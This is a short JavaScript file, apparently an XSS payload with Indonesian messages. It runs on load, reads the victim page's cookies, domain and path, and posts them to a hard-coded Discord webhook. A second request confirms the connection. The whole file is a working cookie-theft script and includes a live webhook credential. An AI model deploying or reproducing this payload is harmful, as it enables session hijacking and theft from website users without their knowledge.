function discordSend() {
    var textData = "*XSS Alert di* " + document.domain + "\n" +
                   "----------------------------\n\n" +
                   "🌐 URL Target:\n`" + document.location.hostname + document.location.pathname + "`\n\n" +
                   "🍪 Document Cookie:\n" + document.cookie + "";

    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://discord.com/api/webhooks/1391022161015345222/HMB9H_1qG8R__WZZeqC1rTKzcMdLhuyCWZHMHVd0bnP8SfjIW905-CUvtTdIwJmqmJKY', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    var payload = JSON.stringify({ content: textData });

    xhr.send(payload);

    // Kirim log tambahan "berhasil konek ke website"
    var xhr2 = new XMLHttpRequest();
    xhr2.open('POST', 'https://discord.com/api/webhooks/1391022161015345222/HMB9H_1qG8R__WZZeqC1rTKzcMdLhuyCWZHMHVd0bnP8SfjIW905-CUvtTdIwJmqmJKY', true);
    xhr2.setRequestHeader('Content-Type', 'application/json');
    var payload2 = JSON.stringify({ content: `✅ Berhasil konek ke website: ${document.domain}` });
    xhr2.send(payload2);
}

discordSend();
